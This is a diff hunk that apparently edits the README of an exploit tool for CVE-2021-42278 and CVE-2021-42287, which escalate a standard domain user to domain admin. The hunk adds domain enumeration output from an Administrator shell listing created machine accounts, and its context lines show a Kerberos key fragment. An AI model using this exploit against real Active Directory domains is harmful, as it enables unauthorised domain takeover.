@@ -202,8 +202,22 @@ SAMTHEADMIN-78$:des-cbc-md5:b6c8865764e65734
 
 ![image](https://user-images.githubusercontent.com/16593068/146150047-ec267c55-3ffe-40cd-97d3-09942dbd59b9.png)
 
-![image](https://user-images.githubusercontent.com/16593068/146150156-c300b353-a0ee-41ed-8910-cd094edf5429.png)
+```
+C:\Users\Administrator>net group "domain computers" /domain
+组名     Domain Computers
+注释     加入到域中的所有工作站和服务器
 
+成员
+
+-------------------------------------------------------------------------------
+SAMTHEADMIN-18$          SAMTHEADMIN-39$          SAMTHEADMIN-59$
+命令成功完成。
+
+
+C:\Users\Administrator>
+
+```
+![image](https://user-images.githubusercontent.com/16593068/146151192-cb3e107a-0800-4427-b12e-52d99cb9c9b3.png)
 
 
 Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 
